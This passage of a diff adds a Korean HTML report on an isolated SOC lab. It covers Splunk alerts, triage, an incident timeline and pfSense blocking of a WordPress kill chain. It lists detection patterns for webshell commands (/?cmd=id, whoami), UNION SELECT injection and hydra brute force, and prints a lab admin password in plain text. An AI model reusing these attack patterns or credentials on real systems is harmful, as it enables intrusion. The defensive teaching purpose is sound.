+  <tr><td><strong>Webshell Detection</strong></td><td>Critical</td><td><code>index=idx_web "cmd=" | stats count | where count >= 1</code></td><td>*/5분</td><td>19:35 트리거</td></tr>
+  <tr><td><strong>WAF Alert Surge</strong></td><td>Medium</td><td><code>index=idx_web "ModSecurity" | stats count | where count >= 30</code></td><td>*/10분</td><td>19:10, 19:20, 19:30, 19:40 트리거</td></tr>
+</table>
+
+<h2 class="section">4-4. SOC 대시보드 (SOC_Monitor)</h2>
+
+<p>Splunk에 <strong>7개 패널, 3단 레이아웃</strong>의 SOC 관제 대시보드를 구축하였다.</p>
+
+<table>
+  <tr><th>패널</th><th>내용</th><th>공격 시 변화</th></tr>
+  <tr><td><strong>events</strong></td><td>전체 이벤트 수</td><td>80,425 → 83,916건 증가</td></tr>
+  <tr><td><strong>time</strong></td><td>시간대별 추이</td><td>공격 시간대(18:49~19:40) 급증</td></tr>
+  <tr><td><strong>att_type</strong></td><td>공격 유형 파이차트</td><td>ET SCAN 비율 급증</td></tr>
+  <tr><td><strong>att_ip</strong></td><td>공격자 IP Top5</td><td>10.50.50.30 최다</td></tr>
+  <tr><td><strong>waf</strong></td><td>WAF 탐지 현황</td><td>Rule 949110, 913100 다수</td></tr>
+  <tr><td><strong>login_history</strong></td><td>로그인 시도 IP별</td><td>10.50.50.30: 965건</td></tr>
+  <tr><td><strong>db_approach</strong></td><td>DB 접근 로그</td><td>웹쉘 경유 접근 기록</td></tr>
+</table>
+
+<div class="img-container">
+  <img src="/home/user/siem-project/phase2-detect/images/splunk-timechart.png" alt="Splunk Timechart">
+  <div class="img-caption">[그림 4-2] Splunk Timechart — Snort Priority 이벤트의 시간대별 분포 (공격 시간대 급증 확인)</div>
+</div>
+
+<div class="img-container">
+  <img src="/home/user/siem-project/phase2-detect/images/splunk-src-stats.png" alt="Splunk 공격자 IP 통계">
+  <div class="img-caption">[그림 4-3] Splunk 공격자 IP 통계 — 10.50.50.17 출발 Priority 이벤트 1,142건 확인</div>
+</div>
+
+<div class="page-break"></div>
+
+<!-- ==================== CHAPTER 5 ==================== -->
+<h1 class="chapter">5. 관제 운영</h1>
+
+<h2 class="section">5-1. 대시보드 모니터링 및 경보 분류</h2>
+
+<p>Phase 4에서 Kali(10.50.50.30)의 킬체인 공격을 실시간으로 SOC 대시보드에서 모니터링하며 경보를 분류하였다. 총 <strong>7건의 Splunk Alert</strong>가 트리거되었다.</p>
+
+<table>
+  <tr><th>시각 (KST)</th><th>Alert</th><th>Severity</th><th>트리거 원인</th></tr>
+  <tr><td>19:10:01</td><td>WAF Alert Surge</td><td>Medium</td><td>브루트포스 초기 탐지</td></tr>
+  <tr><td>19:20:01</td><td><strong>Brute Force Detection</strong></td><td><strong>Critical</strong></td><td>wp-login.php POST 965건</td></tr>
+  <tr><td>19:20:01</td><td>WAF Alert Surge</td><td>Medium</td><td>hydra → ModSecurity Rule 913100</td></tr>
+  <tr><td>19:30:03</td><td>WAF Alert Surge</td><td>Medium</td><td>anomaly score 초과</td></tr>
+  <tr><td>19:35:01</td><td><strong>SQL Injection Detection</strong></td><td><strong>Critical</strong></td><td>Snort SID 1000004 UNION SELECT 4건</td></tr>
+  <tr><td>19:35:01</td><td><strong>Webshell Detection</strong></td><td><strong>Critical</strong></td><td>/?cmd=id, /?cmd=whoami 등</td></tr>
+  <tr><td>19:40:02</td><td>WAF Alert Surge</td><td>Medium</td><td>웹쉘 → ModSecurity 탐지</td></tr>
+</table>
+
+<h2 class="section">5-2. 정탐/오탐 판별</h2>
+
+<p>각 경보에 대해 <strong>정탐(True Positive) / 오탐(False Positive)</strong>을 판별하였다.</p>
+
+<table>
+  <tr><th>경보</th><th>판별</th><th>근거</th></tr>
+  <tr><td>ET SCAN (WPScan)</td><td><strong>정탐</strong></td><td>User-Agent "WPScan" 명시, 단시간 대량 요청</td></tr>
+  <tr><td>Brute Force 965건</td><td><strong>정탐</strong></td><td>동일 IP 초당 다수 POST, User-Agent "Hydra"</td></tr>
+  <tr><td>ModSecurity 913100</td><td><strong>정탐</strong></td><td>security scanner User-Agent 탐지</td></tr>
+  <tr><td>SID 1000004 SQLi</td><td><strong>정탐</strong></td><td>UNION SELECT 페이로드 확인</td></tr>
+  <tr><td>Webshell cmd=</td><td><strong>정탐</strong></td><td>시스템 명령 파라미터, uid=33(www-data) 응답</td></tr>
+  <tr><td>login 10.0.50.100</td><td><strong>정상</strong></td><td>mng-mint 관리자 정상 접속, 빈도 1건</td></tr>
+</table>
+
+<h2 class="section">5-3. 관제 일지 (INC-001 ~ INC-006)</h2>
+
+<table>
+  <tr><th>번호</th><th>사건</th><th>MITRE ATT&CK</th><th>위험도</th><th>판별</th><th>대응</th></tr>
+  <tr><td>INC-001</td><td>WPScan 정찰 탐지</td><td>T1595 Active Scanning</td><td>Medium</td><td>정탐</td><td>L1 모니터링</td></tr>
+  <tr><td>INC-002</td><td>WordPress 브루트포스</td><td>T1110 Brute Force</td><td><strong>Critical</strong></td><td>정탐</td><td>L2 대응</td></tr>
+  <tr><td>INC-003</td><td>SQL Injection 공격</td><td>T1190 Exploit Public App</td><td><strong>Critical</strong></td><td>정탐</td><td>L2 대응</td></tr>
+  <tr><td>INC-004</td><td>웹쉘 명령 실행</td><td>T1505.003 Web Shell</td><td><strong>Critical</strong></td><td>정탐</td><td>L3 긴급 대응</td></tr>
+  <tr><td>INC-005</td><td>DB 데이터 유출</td><td>T1213 Data from Repos</td><td><strong>Critical</strong></td><td>정탐</td><td>L4 긴급 대응</td></tr>
+  <tr><td>INC-006</td><td>IP 차단 및 검증</td><td>—</td><td>—</td><td>차단 성공</td><td>pfSense Block</td></tr>
+</table>
+
+<div class="page-break"></div>
+
+<!-- ==================== CHAPTER 6 ==================== -->
+<h1 class="chapter">6. 대응 및 검증</h1>
+
+<h2 class="section">6-1. 대응 타임라인</h2>
+
+<div class="timeline">
+  <div class="timeline-item">
+    <div class="timeline-time">18:49 KST</div>
+    <div class="timeline-title">WPScan 정찰 탐지</div>
+    <div class="timeline-desc">Snort ET SCAN 시그니처 다수 탐지. L1 모니터링 — 후속 공격 관찰 결정</div>
+  </div>
+  <div class="timeline-item">
+    <div class="timeline-time">19:16 KST</div>
+    <div class="timeline-title">Brute Force 시작 (965건)</div>
+    <div class="timeline-desc">Apache 로그에 POST /wp-login.php + User-Agent "Hydra" 대량 기록. L2 대응 준비</div>
+  </div>
+  <div class="timeline-item critical">
+    <div class="timeline-time">19:20 KST</div>
+    <div class="timeline-title">Brute Force Detection Alert 트리거 (Critical)</div>
+    <div class="timeline-desc">Splunk Triggered Alerts 확인. 공격 확정, 차단 검토 시작</div>
+  </div>
+  <div class="timeline-item critical">
+    <div class="timeline-time">19:24 KST</div>
+    <div class="timeline-title">SQL Injection 시도 (4건)</div>
+    <div class="timeline-desc">Snort SID 1000004 탐지. sqlmap 자동화 도구에 의한 UNION SELECT 시도</div>
+  </div>
+  <div class="timeline-item critical">
+    <div class="timeline-time">19:30 KST</div>
+    <div class="timeline-title">웹쉘 명령 실행 탐지</div>
+    <div class="timeline-desc">/?cmd=id, /?cmd=whoami 요청. uid=33(www-data) 응답 확인. L3 긴급 대응</div>
+  </div>
+  <div class="timeline-item critical">
+    <div class="timeline-time">19:35 KST</div>
+    <div class="timeline-title">DB 데이터 유출 확인</div>
+    <div class="timeline-desc">웹쉘 경유 wp_users 테이블 SELECT 성공. admin 계정 해시 유출. L4 긴급 대응</div>
+  </div>
+  <div class="timeline-item">
+    <div class="timeline-time">19:40 KST</div>
+    <div class="timeline-title">pfSense WAN Block 룰 적용</div>
+    <div class="timeline-desc">10.50.50.30 전체 TCP 차단. WAN 룰 최상단 배치</div>
+  </div>
+  <div class="timeline-item">
+    <div class="timeline-time">19:40~ KST</div>
+    <div class="timeline-title">차단 검증 완료</div>
+    <div class="timeline-desc">curl 타임아웃 + WPScan "Scan Aborted: seems to be down" 확인. 차단 성공</div>
+  </div>
+</div>
+
+<h2 class="section">6-2. IP 차단 및 검증</h2>
+
+<table>
+  <tr><th>조치</th><th>상세</th></tr>
+  <tr><td><strong>pfSense WAN Block</strong></td><td>Source: 10.50.50.30, Protocol: TCP, Destination: Any — WAN 룰 최상단 배치</td></tr>
+  <tr><td><strong>검증 — curl</strong></td><td><code>curl -s --max-time 10 "http://10.0.0.254:8080/"</code> → 응답 없음 (타임아웃)</td></tr>
+  <tr><td><strong>검증 — WPScan</strong></td><td>"Scan Aborted: The url supplied seems to be down (Timeout was reached)"</td></tr>
+  <tr><td><strong>기존 차단</strong></td><td>att-mint(10.50.50.17)도 Phase 2에서 Block 처리 완료</td></tr>
+</table>
+
+<div class="img-container">
+  <img src="/home/user/siem-project/phase2-detect/images/snort-block-verify.png" alt="차단 후 재공격 검증">
+  <div class="img-caption">[그림 6-1] 차단 후 재공격 검증 — Nmap 스캔 시 80/tcp만 응답, curl 타임아웃 확인</div>
+</div>
+
+<div class="img-container">
+  <img src="/home/user/siem-project/phase2-detect/images/snort-block-after.png" alt="Snort Block 설정">
+  <div class="img-caption">[그림 6-2] Snort Block Settings — Block Offenders 활성화, Legacy Mode, Kill States 설정</div>
+</div>
+
+<div class="page-break"></div>
+
+<!-- ==================== CHAPTER 7 ==================== -->
+<h1 class="chapter">7. 분석 및 개선 권고</h1>
+
+<h2 class="section">7-1. MITRE ATT&CK 매핑</h2>
+
+<table>
+  <tr><th>Tactic</th><th>Technique</th><th>ID</th><th>탐지</th><th>탐지 소스</th><th>Alert</th></tr>
+  <tr><td>Reconnaissance</td><td>Active Scanning</td><td>T1595</td><td>&#x2705;</td><td>Snort ET SCAN</td><td>Scanner Detection</td></tr>
+  <tr><td>Initial Access</td><td>Exploit Public-Facing App</td><td>T1190</td><td>&#x2705;</td><td>Snort SID 1000004</td><td>SQL Injection Detection</td></tr>
+  <tr><td>Credential Access</td><td>Brute Force</td><td>T1110</td><td>&#x2705;</td><td>Apache + ModSecurity</td><td>Brute Force + WAF Surge</td></tr>
+  <tr><td>Persistence</td><td>Web Shell</td><td>T1505.003</td><td>&#x2705;</td><td>Apache (cmd=)</td><td>Webshell + WAF Surge</td></tr>
+  <tr><td>Discovery</td><td>Network Service Scan</td><td>T1046</td><td>&#x2705;</td><td>Apache (cmd=)</td><td>Webshell에 포함</td></tr>
+  <tr><td>Collection</td><td>Data from Info Repos</td><td>T1213</td><td>&#x26A0;&#xFE0F;</td><td>웹쉘 cmd= (간접)</td><td>전용 Alert 미설정</td></tr>
+  <tr><td>Exfiltration</td><td>Over C2 Channel</td><td>T1041</td><td>&#x1F6E1;&#xFE0F;</td><td>DMZ 아웃바운드 차단</td><td>네트워크 레벨 차단</td></tr>
+</table>
+
+<h2 class="section">7-2. 탐지 커버리지 분석</h2>
+
+<div class="stats-row">
+  <div class="stat-card success">
+    <div class="number">5/7</div>
+    <div class="label">완전 탐지</div>
+  </div>
+  <div class="stat-card">
+    <div class="number">1/7</div>
+    <div class="label">부분 탐지</div>
+  </div>
+  <div class="stat-card success">
+    <div class="number">1/7</div>
+    <div class="label">네트워크 차단</div>
+  </div>
+</div>
+
+<ul>
+  <li><strong>완전 탐지 (5/7):</strong> 정찰, SQLi, 브루트포스, 웹쉘, 내부정찰 — Snort + Apache 로그 + ModSecurity로 탐지</li>
+  <li><strong>부분 탐지 (1/7):</strong> DB 접근 — 정상 DB 쿼리와 웹쉘 경유 쿼리를 구분할 수 없음 (MySQL Audit Plugin 필요)</li>
+  <li><strong>네트워크 차단 (1/7):</strong> 유출 시도 — DMZ 아웃바운드 차단 정책으로 사전 차단</li>
+</ul>
+
+<h2 class="section">7-3. 개선 권고사항</h2>
+
+<h3 class="subsection">탐지 개선 (높음)</h3>
+<table>
+  <tr><th>영역</th><th>현재 상태</th><th>개선 방안</th></tr>
+  <tr><td>브루트포스 탐지</td><td>Snort 8건 vs Apache 965건</td><td>Apache 로그 기반 Alert을 주 탐지 소스로 지정</td></tr>
+  <tr><td>DB 접근 탐지</td><td>정상/비정상 구분 불가</td><td>MySQL Audit Plugin 활성화 + 비정상 쿼리 패턴 Alert</td></tr>
+  <tr><td>WAF 모드</td><td>DetectionOnly (탐지만)</td><td>SecRuleEngine On 전환으로 실제 차단 수행</td></tr>
+</table>
+
+<h3 class="subsection">인프라 보강 (중간)</h3>
+<table>
+  <tr><th>영역</th><th>현재 상태</th><th>개선 방안</th></tr>
+  <tr><td>DMZ↔Inner-net</td><td>WordPress→MySQL 3306 허용</td><td>DB 프록시 도입, 접근 제어 강화</td></tr>
+  <tr><td>WordPress 보안</td><td>wp-config.php 평문 인증정보</td><td>환경변수/별도 보호 파일로 분리</td></tr>
+  <tr><td>비밀번호 정책</td><td>admin/rlaquddn1@ (약한 비밀번호)</td><td>강력한 비밀번호 정책 + 2FA 적용</td></tr>
+  <tr><td>파일 관리</td><td>WP File Manager로 웹쉘 삽입 가능</td><td>불필요 플러그인 제거, 업로드 제한</td></tr>
+</table>
+
+<h3 class="subsection">프로세스 개선</h3>
+<table>
+  <tr><th>영역</th><th>개선 방안</th></tr>
+  <tr><td>경보 대응 절차</td><td>Triage → 분석 → 대응 → 검증 → 보고의 표준 프로세스 문서화</td></tr>
+  <tr><td>에스컬레이션</td><td>L1~L4 단계별 판단 기준 및 에스컬레이션 경로 명확화</td></tr>
+  <tr><td>IOC 관리</td><td>탐지된 IOC(IP, User-Agent, 페이로드)를 DB화하여 차단 자동화</td></tr>
+</table>
+
+<div class="page-break"></div>
+
+<!-- ==================== CHAPTER 8 ==================== -->
+<h1 class="chapter">8. SOC 분석가 사고 확장</h1>
+
+<p>이 프로젝트는 격리 환경에서의 실습이었다. 실제 SOC 관제 환경에서는 단순 "탐지 → 차단"을 넘어서, 더 깊은 분석과 판단이 요구된다.</p>
+
+<h2 class="section">8-1. STRIDE 위협 모델링</h2>
+
+<p>킬체인 각 단계를 STRIDE 프레임워크로 분류하면 어떤 종류의 대응이 필요한지 빠르게 판단할 수 있다.</p>
+
+<table>
+  <tr><th>킬체인 단계</th><th>STRIDE</th><th>위협</th><th>실습 사례</th><th>실무 대응</th></tr>
+  <tr><td>브루트포스</td><td><strong>Spoofing</strong></td><td>정상 사용자 위장</td><td>hydra로 admin 크래킹</td><td>인증 강화, 2FA</td></tr>
+  <tr><td>웹쉘 삽입</td><td><strong>Tampering</strong></td><td>서버 파일 변조</td><td>hello.php 악성코드 삽입</td><td>무결성 검증</td></tr>
+  <tr><td>웹쉘 경유</td><td><strong>Repudiation</strong></td><td>추적 회피</td><td>일반 HTTP 요청으로 위장</td><td>상세 감사 로깅</td></tr>
+  <tr><td>DB 탈취</td><td><strong>Info Disclosure</strong></td><td>민감 정보 노출</td><td>wp_users 해시, DB 인증정보</td><td>데이터 접근 통제</td></tr>
+  <tr><td>대량 스캔</td><td><strong>DoS</strong> 가능성</td><td>서비스 부하</td><td>1,970 requests / 4분</td><td>Rate limiting</td></tr>
+  <tr><td>웹쉘 명령</td><td><strong>Elevation</strong></td><td>권한 상승</td><td>www-data로 시스템 명령</td><td>최소 권한 원칙</td></tr>
+</table>
+
+<h2 class="section">8-2. PASTA 비즈니스 영향 분석</h2>
+
+<p>기술적 심각도와 비즈니스 영향은 다르다. PASTA 관점에서 우선순위를 매기면:</p>
+
+<table>
+  <tr><th>취약점</th><th>기술적 심각도</th><th>비즈니스 영향</th><th>우선순위</th></tr>
+  <tr><td>wp-config.php 인증정보 노출</td><td>High</td><td><strong>Critical</strong> — DB 전체 접근, 법적 책임</td><td>1순위</td></tr>
+  <tr><td>약한 비밀번호 (admin/rlaquddn1@)</td><td>Medium</td><td><strong>High</strong> — 관리자 탈취, 사이트 변조</td><td>2순위</td></tr>
+  <tr><td>WP File Manager 취약점</td><td>High</td><td><strong>High</strong> — 웹쉘 삽입, 서버 장악</td><td>3순위</td></tr>
+  <tr><td>ModSecurity DetectionOnly</td><td>Low</td><td><strong>Medium</strong> — 탐지만, 차단 안 함</td><td>4순위</td></tr>
+</table>
+
+<h2 class="section">8-3. EDR 연계 및 AI 활용 방향</h2>
+
+<h3 class="subsection">EDR 연계</h3>
+
+<p>현재 환경에는 EDR이 없다. EDR을 연계하면 네트워크(Snort/WAF) + 엔드포인트(프로세스 트리, 파일 변경, 메모리 분석)를 통합하여 더 정밀한 탐지가 가능하다.</p>
+
+<pre><code>[현재 — 네트워크만]
+  Apache 로그에서 /?cmd= 탐지 → 수동으로 웹쉘 확인
+
+[EDR 연계 시]
+  www-data → shell_exec() → mysql 자식 프로세스 → hello.php 변경 자동 탐지 → 엔드포인트 자동 격리</code></pre>
+
+<h3 class="subsection">AI 활용</h3>
+
+<ul>
+  <li><strong>이벤트 자동 분류:</strong> 대량 경보 중 정탐/오탐 AI 1차 분류 → 분석가는 "확인 필요"에만 집중</li>
+  <li><strong>IP 평판 자동 조회:</strong> VirusTotal/AbuseIPDB 자동 연동 → 컨텍스트가 붙은 경보 제공</li>
+  <li><strong>킬체인 패턴 인식:</strong> 정찰 → 브루트포스 → 웹쉘 순서를 인식하여 조기 경보</li>
+  <li><strong>대응 자동화:</strong> 방화벽 룰 추가, EDR 격리 등을 AI가 제안 → 분석가 승인</li>
+</ul>
+
+<div class="info-box">
+  <strong>이 프로젝트의 의미:</strong> "공격 시뮬레이션 → 탐지 → 분석 → 대응" 사이클은 실제 SOC Tier 1 업무의 축소판이다. 인프라 구축부터 공격자 관점의 킬체인 수행, 방어자 관점의 탐지 룰 설계, 그리고 관제 대응까지 전체 흐름을 경험함으로써 SOC 분석가의 핵심 역량인 <strong>"왜 이 경보가 떴는가? 정탐인가? 다음은 무엇인가?"</strong>의 분석적 사고를 체득하였다.
+</div>
+
+<div class="page-break"></div>
+
+<!-- ==================== APPENDIX ==================== -->
+<h1 class="chapter">부록. IOC 및 Splunk 쿼리 모음</h1>
+
+<h2 class="section">A-1. IOC (Indicators of Compromise)</h2>
+
+<h3 class="subsection">공격자 IP</h3>
+<table>
+  <tr><th>IP</th><th>역할</th><th>차단 여부</th></tr>
+  <tr><td>10.50.50.30</td><td>Kali Linux (Phase 3~4 주 공격자)</td><td>pfSense WAN Block</td></tr>
+  <tr><td>10.50.50.17</td><td>att-mint (Phase 1~2 공격자)</td><td>pfSense WAN Block</td></tr>
+</table>
+
+<h3 class="subsection">악성 User-Agent</h3>
+<table>
+  <tr><th>User-Agent</th><th>도구</th><th>탐지 소스</th></tr>
+  <tr><td><code>WPScan v3.8.28</code></td><td>WPScan</td><td>Snort ET SCAN</td></tr>
+  <tr><td><code>Mozilla/5.0 (Hydra)</code></td><td>hydra</td><td>Apache + ModSecurity 913100</td></tr>
+  <tr><td><code>sqlmap/1.10.6#stable</code></td><td>sqlmap</td><td>Snort SID 1000004</td></tr>
+</table>
+
+<h3 class="subsection">악성 페이로드 패턴</h3>
+<table>
+  <tr><th>패턴</th><th>공격 유형</th><th>탐지 쿼리</th></tr>
+  <tr><td><code>/?cmd=</code></td><td>웹쉘 명령 실행</td><td><code>index=idx_web "cmd="</code></td></tr>
+  <tr><td><code>UNION SELECT</code></td><td>SQL Injection</td><td><code>index=pfsense "1000004"</code></td></tr>
+  <tr><td><code>POST /wp-login.php</code> (대량)</td><td>브루트포스</td><td><code>index=idx_web "wp-login.php" "POST"</code></td></tr>
+</table>
+
+<h2 class="section">A-2. Splunk 쿼리 모음</h2>
+
+<h3 class="subsection">대시보드 쿼리</h3>
+<pre><code># 전체 이벤트 수
+index=pfsense OR index=idx_web OR index=idx_waf OR index=idx_db | stats count
+
+# 공격자 IP Top5
+index=pfsense "Priority"
+| rex "\{(?P&lt;proto&gt;\w+)\}\s+(?P&lt;src_ip&gt;\d+\.\d+\.\d+\.\d+)"
+| top 5 src_ip
+
+# 공격 유형 분포
+index=pfsense "Priority"
+| rex "\[\d+:\d+:\d+\]\s+(?P&lt;signature&gt;[^\[]+?)\s+\["
+| top 10 signature
+
+# 로그인 시도 IP별
+index=idx_web "wp-login"
+| rex "client\s+(?P&lt;src_ip&gt;\d+\.\d+\.\d+\.\d+)"
+| stats count by src_ip</code></pre>
+
+<h3 class="subsection">Alert 쿼리</h3>
+<pre><code># Brute Force Detection (Critical, */5분)
+index=idx_web "wp-login.php" "POST" | stats count | where count >= 10
+
+# SQL Injection Detection (Critical, */5분)
+index=pfsense ("SQL" OR "1000004") "Priority" | stats count | where count >= 2
+
+# Webshell Detection (Critical, */5분)
+index=idx_web "cmd=" | stats count | where count >= 1
+
+# WAF Alert Surge (Medium, */10분)
+index=idx_web "ModSecurity" | stats count | where count >= 30</code></pre>
+
+<br>
+<div class="footer">
+  <p>SIEM 공격 탐지 및 대응 실습 프로젝트 — 2026.08.27</p>
+  <p>격리된 가상 SOC 실습 랩 환경 | 방어 보안 교육용</p>
+</div>
+
+</body>
+</html>
